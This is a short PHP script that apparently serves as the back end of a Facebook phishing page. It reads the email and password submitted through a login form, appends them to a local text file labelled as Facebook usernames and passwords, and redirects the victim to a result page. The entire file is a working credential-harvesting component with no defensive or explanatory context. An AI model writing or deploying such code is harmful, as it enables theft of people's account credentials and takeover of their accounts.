<?php

file_put_contents("../userpass/usernames.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: ./result.html');
exit();
?>